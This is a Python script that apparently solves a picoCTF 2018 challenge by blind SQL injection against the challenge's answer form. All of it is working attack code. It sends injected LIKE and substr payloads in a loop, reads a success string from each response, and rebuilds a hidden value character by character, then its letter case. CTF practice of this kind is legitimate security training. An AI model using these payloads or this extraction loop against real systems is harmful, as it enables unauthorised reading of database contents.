#!/usr/bin/env python3
import requests
import string

CHAR_LIST = (string.printable
                .replace(' ', '')
                .replace('\'', '')
                .replace('"', ''))


payload = "' or answer COLLATE Latin1_General_CS_AS LIKE '?%"

answer = '41andsixsixths'
while len(answer) < 100:
    print(f"Progress: {answer} [{len(answer)}]")

    found = False
    for ch in CHAR_LIST:
        # % and _ are used as wildcards in SQLite.
        # escape them
        ch = ch.replace('%', '\\%') 
        ch = ch.replace('_', '\\_')

        guess = answer + ch
        
        r = requests.post("http://2018shell2.picoctf.com:28120/answer2.php", 
            data= {
                'answer': payload.replace('?', guess),
                'debug': '0',
            }
        )

        # if successful return
        if 'You are so close' in r.text:
            answer += ch
            found = True
            print("Success:", ch)
            break
        
        print("Failed:", ch)

    if not found:
        print("Case insensitive answer: ", answer)
        break


# Check capital
answer = list(answer)
check_caps = "' or substr(answer, 3, 1) <> lower(substr(answer, 3, 1)) ;--"


for index in range(len(answer)):
    print(f"Progress: {answer} [Checking {index}]")

    # sql substr() is 1-indexed
    sql_index = str(index + 1)
    r = requests.post("http://2018shell2.picoctf.com:28120/answer2.php", 
        data= {
            'answer': check_caps.replace('3', sql_index),
            'debug': '0',
        }
    )

    if 'You are so close' in r.text:
        # case is not equal, swap it
        answer[index] = answer[index].upper()

print("Success:", ''.join(answer))

